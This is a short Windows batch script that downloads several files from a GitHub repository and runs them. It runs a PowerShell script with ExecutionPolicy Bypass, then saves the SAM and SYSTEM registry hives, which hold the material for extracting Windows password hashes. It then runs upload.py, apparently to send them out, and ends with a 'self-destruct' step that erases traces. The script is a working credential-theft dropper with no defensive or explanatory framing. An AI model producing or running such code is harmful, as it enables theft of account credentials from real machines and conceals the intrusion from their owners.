@echo off
setlocal ENABLEDELAYEDEXPANSION

REM Get current location
set SCRIPT_DIR=%~dp0

REM Go to file location
cd /d "%SCRIPT_DIR%"

REM Download necesary files
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/.env > ".env"
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/install.bat > "install.bat"
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/intialize.ps1 > "initialize.ps1"
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/upload.py > "upload.py"
curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/erase.bat > "erase.bat"

REM Verify if initialize.ps1 is installed correctly
findstr /i "404" initialize.ps1 >nul
if %errorlevel%==0 (
    echo [!] Eroare: initialize.ps1 nu a fost găsit sau GitHub a returnat 404.
    pause
    exit /b
)

REM Run powershell script
powershell -ExecutionPolicy Bypass -File initialize.ps1

REM Install dependencies
call install.bat

REM Save registry (necesită privilegii de admin)
powershell -Command "reg save HKLM\sam .\sam.save"
powershell -Command "reg save HKLM\system .\system.save"

REM Run python script
py upload.py

REM Self-destruct operation
call erase.bat

pause
